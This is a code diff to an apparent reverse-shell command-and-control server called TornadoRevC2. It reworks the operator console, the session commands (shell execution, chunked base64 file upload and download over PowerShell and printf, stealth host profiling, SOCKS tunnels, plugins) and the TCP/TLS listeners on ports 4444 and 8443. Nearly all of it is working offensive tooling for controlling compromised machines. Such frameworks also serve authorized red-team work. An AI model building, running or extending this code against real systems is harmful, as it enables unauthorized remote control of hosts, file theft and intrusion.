@@ -1,3 +1,4 @@
+import argparse
 import base64
 import datetime
 import hashlib
@@ -78,8 +79,6 @@ class TORNADOREVC2:
         self.updater = Updater(self)
         self._tcp_server = None
         self._tls_server = None
-        self.console_owns_listeners = True
-        self.event_bus = None
         self.colors = {
             'cyan': '\033[96m', 'green': '\033[92m', 'yellow': '\033[93m',
             'red': '\033[91m', 'bold': '\033[1m', 'end': '\033[0m', 'blue': '\033[94m',
@@ -421,6 +420,7 @@ class TORNADOREVC2:
     _WIN_PS_CMD_LIMIT = 8190
 
     def _max_win_inline_chunk(self, remote_path, truncate=False):
+        """Largest raw payload that fits in one inline PowerShell write command."""
         path = self._escape_path(remote_path, 'windows')
         mode = 'Create' if truncate else 'Append'
         template = (
@@ -432,13 +432,14 @@ class TORNADOREVC2:
         overhead = len(f'powershell -NoProfile -Command "{template}"')
         available = self._WIN_PS_CMD_LIMIT - overhead
         if available <= 0:
-            return 4096
+            return CHUNK_SIZE['windows']
         return max(1024, int(available * 3 / 4))
 
     def _write_chunk_size(self, remote_path, shell_type, truncate=False):
+        base = CHUNK_SIZE.get(shell_type, CHUNK_SIZE['unknown'])
         if shell_type == 'windows':
-            return 4096   # Safe with -EncodedCommand (well under 8190 chars)
-        return CHUNK_SIZE.get(shell_type, CHUNK_SIZE['unknown'])
+            return min(base, self._max_win_inline_chunk(remote_path, truncate=truncate))
+        return base
 
     def _win_ps_cmd(self, script):
         encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
@@ -614,28 +615,18 @@ class TORNADOREVC2:
         return True
 
     def _remote_write_chunk(self, client_sock, remote_path, chunk_bytes, shell_type, truncate=False, skip_flush=False):
+        path = self._escape_path(remote_path, shell_type)
+        b64 = base64.b64encode(chunk_bytes).decode()
         if shell_type == 'windows':
-            path_esc = remote_path.replace('\\', '\\\\')
-            path_esc = path_esc.replace('"', '`"')
-            b64 = base64.b64encode(chunk_bytes).decode('ascii')
-            if truncate:
-                ps_script = f"""
-    $b = [Convert]::FromBase64String('{b64}')
-    [IO.File]::WriteAllBytes("{path_esc}", $b)
-    '{XFER_MARK_START}OK{XFER_MARK_END}'
-    """
-            else:
-                ps_script = f"""
-    $b = [Convert]::FromBase64String('{b64}')
-    [IO.File]::AppendAllBytes("{path_esc}", $b)
-    '{XFER_MARK_START}OK{XFER_MARK_END}'
-    """
-            cmd = self._win_ps_cmd(ps_script)
-            if cmd is None:
-                cmd = self._win_ps_inline(ps_script)
+            mode = 'Create' if truncate else 'Append'
+            win_ps = (
+                f"$d=[Convert]::FromBase64String('{b64}');"
+                f"$fs=[IO.File]::Open('{path}', [IO.FileMode]::{mode});"
+                f"$fs.Write($d,0,$d.Length);$fs.Close();"
+                f"'{XFER_MARK_START}OK{XFER_MARK_END}'"
+            )
+            cmd = self._win_ps_inline(win_ps)
         else:
-            path = self._escape_path(remote_path, shell_type)
-            b64 = base64.b64encode(chunk_bytes).decode()
             mode = 'wb' if truncate else 'ab'
             cmd = (
                 f"printf '%s' '{XFER_MARK_START}'; "
@@ -646,13 +637,10 @@ class TORNADOREVC2:
                 f"(printf '%s' '{b64}' | base64 -d >> '{path}' && printf 'OK')); "
                 f"printf '%s' '{XFER_MARK_END}'"
             )
-
         if not skip_flush:
             self._flush_shell(client_sock, timeout=0.2)
-
         if not self.send_to_revshell(client_sock, cmd):
             return False
-
         output = self.recv_output(client_sock, timeout=60.0, until_marker=XFER_MARK_END)
         payload = self._extract_marked(output)
         return payload == 'OK'
@@ -986,76 +974,52 @@ class TORNADOREVC2:
                 try:
                     cmd = input(prompt_text()).strip()
                     last_interrupt = 0.0
-                    result = self.dispatch_session_command(client_sock, cmd)
-                    if result in ('exit_session', 'disconnected'):
+                    if cmd.lower() in ['exit', 'quit', 'e', 'q']:
                         break
-                except KeyboardInterrupt:
-                    now = time.time()
-                    if now - last_interrupt < 1.5:
-                        break
-                    last_interrupt = now
-                    term.send_interrupt()
-                    self.recv_output(client_sock, timeout=0.5)
-                    print(f"\n{self.colors['yellow']}^C sent to remote (Ctrl+C again to exit){self.colors['end']}")
-                except EOFError:
-                    break
-        finally:
-            term.teardown_session()
-        self._set_completer_mode('main')
+                    if not cmd:
+                        continue
+                    cmd_parts = cmd.split()
+                    cmd_lower = cmd_parts[0].lower()
 
-    def dispatch_session_command(self, client_sock, cmd):
-        """Handle one client-shell line. Used by the local REPL and daemon IPC."""
-        if cmd is None:
-            return 'continue'
-        cmd = cmd.strip()
-        if not cmd:
-            return 'continue'
-        if cmd.lower() in ('exit', 'quit', 'e', 'q'):
-            return 'exit_session'
-        cmd_parts = cmd.split()
-        cmd_lower = cmd_parts[0].lower()
-        info = self._client_info(client_sock)
-        logger = info.get('logger') if info else None
+                    if cmd_lower == 'sysinfo':
+                        _, mode = self._parse_sysinfo_args(cmd_parts, from_client=True)
+                        self.show_sysinfo(client_sock, refresh=True, mode=mode)
+                        continue
 
-        if cmd_lower == 'sysinfo':
-            _, mode = self._parse_sysinfo_args(cmd_parts, from_client=True)
-            self.show_sysinfo(client_sock, refresh=True, mode=mode)
-            return 'continue'
+                    if cmd_lower in ('socks', 'tunnels'):
+                        if self.tunnels.handle_command(client_sock, cmd_parts, from_client=True):
+                            continue
 
-        if cmd_lower in ('socks', 'tunnels'):
-            if self.tunnels.handle_command(client_sock, cmd_parts, from_client=True):
-                return 'continue'
+                    if cmd_lower == 'upload':
+                        resume, args = self._parse_transfer_args(cmd_parts)
+                        if len(args) >= 2:
+                            self.upload_file(client_sock, args[0], args[1], resume=resume)
+                        else:
+                            print(f"{self.colors['red']}Usage: upload [--resume] <local> <remote>{self.colors['end']}")
+                        continue
 
-        if cmd_lower == 'upload':
-            resume, args = self._parse_transfer_args(cmd_parts)
-            if len(args) >= 2:
-                self.upload_file(client_sock, args[0], args[1], resume=resume)
-            else:
-                print(f"{self.colors['red']}Usage: upload [--resume] <local> <remote>{self.colors['end']}")
-            return 'continue'
+                    if cmd_lower == 'download':
+                        resume, args = self._parse_transfer_args(cmd_parts)
+                        if len(args) >= 2:
+                            self.download_file(client_sock, args[0], args[1], resume=resume)
+                        else:
+                            print(f"{self.colors['red']}Usage: download [--resume] <remote> <local>{self.colors['end']}")
+                        continue
 
-        if cmd_lower == 'download':
-            resume, args = self._parse_transfer_args(cmd_parts)
-            if len(args) >= 2:
-                self.download_file(client_sock, args[0], args[1], resume=resume)
-            else:
-                print(f"{self.colors['red']}Usage: download [--resume] <remote> <local>{self.colors['end']}")
-            return 'continue'
+                    if cmd_lower in ('verify', 'hash') and len(cmd_parts) >= 2:
+                        self.verify_file(client_sock, cmd_parts[1])
+                        continue
 
-        if cmd_lower in ('verify', 'hash') and len(cmd_parts) >= 2:
-            self.verify_file(client_sock, cmd_parts[1])
-            return 'continue'
+                    if cmd_lower == 'export':
+                        if self.exporter.handle_command(cmd_parts, client_sock=client_sock):
+                            continue
 
-        if cmd_lower == 'export':
-            if self.exporter.handle_command(cmd_parts, client_sock=client_sock):
-                return 'continue'
+                    if cmd_lower in ('run', 'plugins'):
+                        if self.plugins.handle_command(cmd_parts, client_sock=client_sock):
+                            continue
 
-        if cmd_lower in ('run', 'plugins'):
-            if self.plugins.handle_command(cmd_parts, client_sock=client_sock):
-                return 'continue'
-
-        if cmd_lower == 'help':
-            print(f"""
+                    if cmd_lower == 'help':
+                        print(f"""
     {self.colors['green']}SESSION:{self.colors['end']}
     sysinfo [--stealth|--full]               Collect/display host information (default: stealth)
     exit(e) / quit(q) / CTRL+C               Return to the main menu
@@ -1083,17 +1047,30 @@ class TORNADOREVC2:
     upload [--resume] <local> <remote>     Chunked upload with SHA256 verify
     download [--resume] <remote> <local>   Chunked download with SHA256 verify
     verify/hash <remote>                   Remote file size and SHA256""")
-            return 'continue'
+                        continue
 
-        print(f"\r{self.colors['yellow']}$ {cmd}{self.colors['end']}", end='', flush=True)
-        if self.send_to_revshell(client_sock, cmd):
-            output = self.recv_output(client_sock)
-            print(f"\r{output}")
-            if logger:
-                logger.log_command(cmd, output)
-            return 'continue'
-        print(f"\r{self.colors['red']}Connection lost{self.colors['end']}")
-        return 'disconnected'
+                    print(f"\r{self.colors['yellow']}$ {cmd}{self.colors['end']}", end='', flush=True)
+                    if self.send_to_revshell(client_sock, cmd):
+                        output = self.recv_output(client_sock)
+                        print(f"\r{output}")
+                        if logger:
+                            logger.log_command(cmd, output)
+                    else:
+                        print(f"\r{self.colors['red']}Connection lost{self.colors['end']}")
+                        break
+                except KeyboardInterrupt:
+                    now = time.time()
+                    if now - last_interrupt < 1.5:
+                        break
+                    last_interrupt = now
+                    term.send_interrupt()
+                    self.recv_output(client_sock, timeout=0.5)
+                    print(f"\n{self.colors['yellow']}^C sent to remote (Ctrl+C again to exit){self.colors['end']}")
+                except EOFError:
+                    break
+        finally:
+            term.teardown_session()
+        self._set_completer_mode('main')
 
     def main_menu(self):
         self._set_completer_mode('main')
@@ -1102,160 +1079,134 @@ class TORNADOREVC2:
                 cmd = input(f"{self.colors['green']}tornado> {self.colors['end']}")
                 if not cmd.strip():
                     continue
-                result = self.dispatch_main_command(cmd.strip().split())
-                if result == 'shutdown':
+                cmd_parts = cmd.strip().split()
+                cmd_lower = cmd_parts[0].lower()
+
+                if cmd_lower == 'payloads':
+                    self.print_payloads()
+                elif cmd_lower in ('status', 'ls'):
+                    self.print_status()
+                elif cmd_lower == 'sessions':
+                    self.registry.list_sessions(self.colors)
+                elif cmd_lower == 'reconnects':
+                    self.registry.list_reconnects(self.colors)
+                elif cmd_lower == 'switch':
+                    if len(cmd_parts) < 2:
+                        print(f"{self.colors['red']}Usage: switch <ID>{self.colors['end']}")
+                        continue
+                    try:
+                        client_sock = self._get_client_by_id(int(cmd_parts[1]))
+                        if not client_sock:
+                            print(f"{self.colors['red']}Client #{cmd_parts[1]} not active{self.colors['end']}")
+                            continue
+                        self.current_client = client_sock
+                        display = self.get_host_info(client_sock).split("@")[0]
+                        print(f"{self.colors['green']}Switched to {display}{self.colors['end']}\n")
+                        self.client_shell_menu(client_sock)
+                        self.current_client = None
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
+                elif cmd_lower == 'kill':
+                    if len(cmd_parts) < 2:
+                        print(f"{self.colors['red']}Usage: kill <ID>{self.colors['end']}")
+                        continue
+                    try:
+                        client_sock = self._get_client_by_id(int(cmd_parts[1]))
+                        if not client_sock:
+                            print(f"{self.colors['red']}Client #{cmd_parts[1]} not found{self.colors['end']}")
+                            continue
+                        self.cleanup_client(client_sock)
+                        print(f"{self.colors['green']}Client #{cmd_parts[1]} terminated{self.colors['end']}")
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
+                elif cmd_lower in ('exit', 'quit', 'e', 'q'):
+                    print(f"\n{self.colors['red']}Shutting down server{self.colors['end']}")
+                    self.running = False
                     break
-            except KeyboardInterrupt:
-                print(f"\n{self.colors['yellow']}For exiting please type exit(e) or quit(q){self.colors['end']}")
-
-    def current_client_id(self):
-        info = self._client_info(self.current_client) if self.current_client else None
-        if not info:
-            return None
-        return info.get('id')
-
-    def dispatch_main_command(self, cmd_parts, shutdown_on_exit=None):
-        """Handle one operator-console line. Used by the local REPL and daemon IPC."""
-        if not cmd_parts:
-            return 'continue'
-        if shutdown_on_exit is None:
-            shutdown_on_exit = self.console_owns_listeners
-        cmd_lower = cmd_parts[0].lower()
-
-        if cmd_lower == 'payloads':
-            self.print_payloads()
-        elif cmd_lower in ('status', 'ls'):
-            self.print_status()
-        elif cmd_lower == 'sessions':
-            self.registry.list_sessions(self.colors)
-        elif cmd_lower == 'reconnects':
-            self.registry.list_reconnects(self.colors)
-        elif cmd_lower == 'switch':
-            if len(cmd_parts) < 2:
-                print(f"{self.colors['red']}Usage: switch <ID>{self.colors['end']}")
-                return 'continue'
-            try:
-                client_sock = self._get_client_by_id(int(cmd_parts[1]))
-                if not client_sock:
-                    print(f"{self.colors['red']}Client #{cmd_parts[1]} not active{self.colors['end']}")
-                    return 'continue'
-                self.current_client = client_sock
-                display = self.get_host_info(client_sock).split("@")[0]
-                print(f"{self.colors['green']}Switched to {display}{self.colors['end']}\n")
-                if not shutdown_on_exit:
-                    return 'attach'
-                self.client_shell_menu(client_sock)
-                self.current_client = None
-            except ValueError:
-                print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
-        elif cmd_lower == 'kill':
-            if len(cmd_parts) < 2:
-                print(f"{self.colors['red']}Usage: kill <ID>{self.colors['end']}")
-                return 'continue'
-            try:
-                client_sock = self._get_client_by_id(int(cmd_parts[1]))
-                if not client_sock:
-                    print(f"{self.colors['red']}Client #{cmd_parts[1]} not found{self.colors['end']}")
-                    return 'continue'
-                self.cleanup_client(client_sock)
-                print(f"{self.colors['green']}Client #{cmd_parts[1]} terminated{self.colors['end']}")
-            except ValueError:
-                print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
-        elif cmd_lower in ('exit', 'quit', 'e', 'q'):
-            if shutdown_on_exit:
-                print(f"\n{self.colors['red']}Shutting down server{self.colors['end']}")
-                self.running = False
-                return 'shutdown'
-            return 'exit_console'
-        elif self.updater.handle_command(cmd_parts):
-            pass
-        elif cmd_lower in ('clear', 'cls'):
-            os.system('cls' if os.name == 'nt' else 'clear')
-            self.print_banner()
-        elif cmd_lower in ('rename', 'rn'):
-            if len(cmd_parts) < 3:
-                print(f"{self.colors['red']}Usage: rename/rn <ID> <name>{self.colors['end']}")
-                return 'continue'
-            try:
-                changed_id = int(cmd_parts[1])
-                new_name = " ".join(cmd_parts[2:]).strip()
-                if not new_name:
-                    raise ValueError
-                with self.client_lock:
-                    for info in self.revshell_clients.values():
-                        if info['id'] == changed_id:
-                            info['name'] = new_name
-                            self.registry.register_active(info, info.get('fingerprint'))
-                            print(f"{self.colors['green']}Client #{changed_id} renamed to '{new_name}'{self.colors['end']}")
-                            break
-                    else:
-                        print(f"{self.colors['red']}Client #{changed_id} not found{self.colors['end']}")
-            except ValueError:
-                print(f"{self.colors['red']}Invalid ID or session name{self.colors['end']}")
-        elif cmd_lower == 'sysinfo':
-            session_id, mode = self._parse_sysinfo_args(cmd_parts)
-            if not session_id:
-                print(f"{self.colors['red']}Usage: sysinfo <ID> [--stealth|--full]{self.colors['end']}")
-                return 'continue'
-            try:
-                client_sock = self._get_client_by_id(int(session_id))
-                if not client_sock:
-                    print(f"{self.colors['red']}Client #{session_id} not active{self.colors['end']}")
-                    return 'continue'
-                self.show_sysinfo(client_sock, refresh=True, mode=mode)
-            except ValueError:
-                print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
-        elif self.exporter.handle_command(cmd_parts):
-            pass
-        elif self.plugins.handle_command(cmd_parts):
-            pass
-        elif self.tunnels.handle_main_command(cmd_parts):
-            pass
-        elif cmd_lower == 'upload':
-            resume, args = self._parse_transfer_args(cmd_parts)
-            if len(args) < 3:
-                print(f"{self.colors['red']}Usage: upload [--resume] <ID> <local> <remote>{self.colors['end']}")
-                return 'continue'
-            try:
-                client_sock = self._get_client_by_id(int(args[0]))
-                if not client_sock:
-                    print(f"{self.colors['red']}Client #{args[0]} not active{self.colors['end']}")
-                    return 'continue'
-                self.upload_file(client_sock, args[1], args[2], resume=resume)
-            except ValueError:
-                print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
-        elif cmd_lower == 'download':
-            resume, args = self._parse_transfer_args(cmd_parts)
-            if len(args) < 3:
-                print(f"{self.colors['red']}Usage: download [--resume] <ID> <remote> <local>{self.colors['end']}")
-                return 'continue'
-            try:
-                client_sock = self._get_client_by_id(int(args[0]))
-                if not client_sock:
-                    print(f"{self.colors['red']}Client #{args[0]} not active{self.colors['end']}")
-                    return 'continue'
-                self.download_file(client_sock, args[1], args[2], resume=resume)
-            except ValueError:
-                print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
-        elif cmd_lower in ('verify', 'hash'):
-            if len(cmd_parts) < 3:
-                print(f"{self.colors['red']}Usage: verify/hash <ID> <remote_path>{self.colors['end']}")
-                return 'continue'
-            try:
-                client_sock = self._get_client_by_id(int(cmd_parts[1]))
-                if not client_sock:
-                    print(f"{self.colors['red']}Client #{cmd_parts[1]} not found{self.colors['end']}")
-                    return 'continue'
-                self.verify_file(client_sock, cmd_parts[2])
-            except ValueError:
-                print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
-        elif cmd_lower == 'help':
-            exit_help = (
-                'exit/quit               Leave console (daemon keeps running)'
-                if not shutdown_on_exit else
-                'exit/quit               Shutdown server'
-            )
-            print(f"""
+                elif self.updater.handle_command(cmd_parts):
+                    pass
+                elif cmd_lower in ('clear', 'cls'):
+                    os.system('cls' if os.name == 'nt' else 'clear')
+                    self.print_banner()
+                elif cmd_lower in ('rename', 'rn'):
+                    if len(cmd_parts) < 3:
+                        print(f"{self.colors['red']}Usage: rename/rn <ID> <name>{self.colors['end']}")
+                        continue
+                    try:
+                        changed_id = int(cmd_parts[1])
+                        new_name = " ".join(cmd_parts[2:]).strip()
+                        if not new_name:
+                            raise ValueError
+                        with self.client_lock:
+                            for info in self.revshell_clients.values():
+                                if info['id'] == changed_id:
+                                    info['name'] = new_name
+                                    self.registry.register_active(info, info.get('fingerprint'))
+                                    print(f"{self.colors['green']}Client #{changed_id} renamed to '{new_name}'{self.colors['end']}")
+                                    break
+                            else:
+                                print(f"{self.colors['red']}Client #{changed_id} not found{self.colors['end']}")
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID or session name{self.colors['end']}")
+                elif cmd_lower == 'sysinfo':
+                    session_id, mode = self._parse_sysinfo_args(cmd_parts)
+                    if not session_id:
+                        print(f"{self.colors['red']}Usage: sysinfo <ID> [--stealth|--full]{self.colors['end']}")
+                        continue
+                    try:
+                        client_sock = self._get_client_by_id(int(session_id))
+                        if not client_sock:
+                            print(f"{self.colors['red']}Client #{session_id} not active{self.colors['end']}")
+                            continue
+                        self.show_sysinfo(client_sock, refresh=True, mode=mode)
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
+                elif self.exporter.handle_command(cmd_parts):
+                    pass
+                elif self.plugins.handle_command(cmd_parts):
+                    pass
+                elif self.tunnels.handle_main_command(cmd_parts):
+                    pass
+                elif cmd_lower == 'upload':
+                    resume, args = self._parse_transfer_args(cmd_parts)
+                    if len(args) < 3:
+                        print(f"{self.colors['red']}Usage: upload [--resume] <ID> <local> <remote>{self.colors['end']}")
+                        continue
+                    try:
+                        client_sock = self._get_client_by_id(int(args[0]))
+                        if not client_sock:
+                            print(f"{self.colors['red']}Client #{args[0]} not active{self.colors['end']}")
+                            continue
+                        self.upload_file(client_sock, args[1], args[2], resume=resume)
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
+                elif cmd_lower == 'download':
+                    resume, args = self._parse_transfer_args(cmd_parts)
+                    if len(args) < 3:
+                        print(f"{self.colors['red']}Usage: download [--resume] <ID> <remote> <local>{self.colors['end']}")
+                        continue
+                    try:
+                        client_sock = self._get_client_by_id(int(args[0]))
+                        if not client_sock:
+                            print(f"{self.colors['red']}Client #{args[0]} not active{self.colors['end']}")
+                            continue
+                        self.download_file(client_sock, args[1], args[2], resume=resume)
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
+                elif cmd_lower in ('verify', 'hash'):
+                    if len(cmd_parts) < 3:
+                        print(f"{self.colors['red']}Usage: verify/hash <ID> <remote_path>{self.colors['end']}")
+                        continue
+                    try:
+                        client_sock = self._get_client_by_id(int(cmd_parts[1]))
+                        if not client_sock:
+                            print(f"{self.colors['red']}Client #{cmd_parts[1]} not active{self.colors['end']}")
+                            continue
+                        self.verify_file(client_sock, cmd_parts[2])
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
+                elif cmd_lower == 'help':
+                    print(f"""
     {self.colors['green']}SESSION MANAGEMENT:{self.colors['end']}
     switch <ID>             Client interaction
     kill <ID>               Terminate client
@@ -1267,10 +1218,8 @@ class TORNADOREVC2:
     payloads                Show payloads list
     clear/cls               Clear screen
     update                  Pull latest from the official repository branch and restart
-    jobs                    List background jobs
-    jobs attach <ID>        Stream output from a job
     help                    This help menu
-    {exit_help}
+    exit/quit               Shutdown server
 
     {self.colors['green']}REPORTING:{self.colors['end']}
     export <ID>                                              Export HTML session transcript
@@ -1297,7 +1246,8 @@ class TORNADOREVC2:
     verify/hash <ID> <remote>                   Remote file size and SHA256
 
     {self.colors['yellow']}Inside a client shell, omit <ID> for session-targeted commands{self.colors['end']}""")
-        return 'continue'
+            except KeyboardInterrupt:
+                print(f"\n{self.colors['yellow']}For exiting please type exit(e) or quit(q){self.colors['end']}")
 
     def cleanup_client(self, client_sock):
         info = None
@@ -1315,12 +1265,8 @@ class TORNADOREVC2:
         if logger:
             logger.log_event('Session disconnected')
         self.registry.mark_disconnected(info)
-        self._emit_operator(
-            f"{self.colors['red']}\n{display} {info['addr'][0]}:{info['addr'][1]} disconnected{self.colors['end']}"
-        )
-        self._emit_operator(
-            f"{self.colors['yellow']}Session metadata preserved — will restore on reconnect (fingerprint: {info.get('fingerprint', '?')}){self.colors['end']}"
-        )
+        print(f"{self.colors['red']}\n{display} {info['addr'][0]}:{info['addr'][1]} disconnected{self.colors['end']}")
+        print(f"{self.colors['yellow']}Session metadata preserved — will restore on reconnect (fingerprint: {info.get('fingerprint', '?')}){self.colors['end']}")
 
     def _close_listener(self, server):
         if server is None:
@@ -1454,58 +1400,45 @@ class TORNADOREVC2:
 
         if reconnected:
             display = client_info["name"] if client_info.get("name") else f"#{client_id}"
-            self._emit_operator(
+            print(
                 f"{self.colors['green']}Client RECONNECTED {display}: {addr[0]}:{addr[1]} "
                 f"({inferred.upper()}) | restored session #{client_id} | switch {client_id}{self.colors['end']}"
             )
             if client_info.get('sysinfo'):
                 si = client_info['sysinfo']
-                self._emit_operator(
+                print(
                     f"{self.colors['cyan']}  Restored: {si.get('username', '?')}@{si.get('hostname', '?')} "
                     f"[{si.get('os', '?')}] (connect #{client_info['connect_count']}){self.colors['end']}"
                 )
         else:
-            self._emit_operator(
+            print(
                 f"{self.colors['green']}New Client #{client_id}: {addr[0]}:{addr[1]} "
                 f"({inferred.upper()}) | switch {client_id}{self.colors['end']}"
             )
 
         if client_info.get('logger'):
-            self._emit_operator(
-                f"{self.colors['blue']}Logs: {client_info['logger'].session_dir}{self.colors['end']}"
-            )
+            print(f"{self.colors['blue']}Logs: {client_info['logger'].session_dir}{self.colors['end']}")
 
-    def _emit_operator(self, message):
-        print(message)
-        bus = getattr(self, 'event_bus', None)
-        if bus is not None:
-            bus.publish('operator.message', {'text': message})
-
-    def start_listeners(self):
-        """Bind reverse-shell TCP/TLS listeners using configured host/ports (not management IPC)."""
+    def start(self):
+        self.print_banner()
         self.ensure_tls_certificates()
         tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         tcp_server.bind((self.host, self.revshell_port))
         tcp_server.listen(100)
-        self._tcp_server = tcp_server
         tls_context = self.create_tls_context()
         tls_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         tls_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         tls_server.bind((self.host, self.tls_port))
         tls_server.listen(100)
+        self._tcp_server = tcp_server
         self._tls_server = tls_server
         self.running = True
         threading.Thread(target=self.listener, args=(tcp_server, False), daemon=True).start()
         threading.Thread(target=self.listener, args=(tls_server, True, tls_context), daemon=True).start()
-
-    def start(self):
-        """Legacy foreground mode: own listeners and block on the operator REPL."""
-        self.print_banner()
-        self.start_listeners()
         self._init_readline()
         self.main_menu()
-        self.shutdown_for_restart()
+        self.running = False
 
     def listener(self, server, use_tls=False, tls_context=None):
         while self.running:
@@ -1523,8 +1456,18 @@ class TORNADOREVC2:
 
 
 def main():
-    from .cli.main import main as cli_main
-    cli_main()
+    parser = argparse.ArgumentParser(description='TornadoRevC2')
+    parser.add_argument('-H', '--host', default='0.0.0.0', help='Bind address')
+    parser.add_argument('-p', '--port', type=int, default=4444, help='TCP listener port')
+    parser.add_argument('-tp', '--tls-port', type=int, default=8443, help='TLS listener port')
+    parser.add_argument('-c', '--cert', default='server.pem', help='TLS certificate file')
+    parser.add_argument('-k', '--key', default='server.key', help='TLS private key file')
+    args = parser.parse_args()
+    srv = TORNADOREVC2(
+        host=args.host, revshell_port=args.port, tls_port=args.tls_port,
+        certfile=args.cert, keyfile=args.key,
+    )
+    srv.start()
 
 
 if __name__ == '__main__':
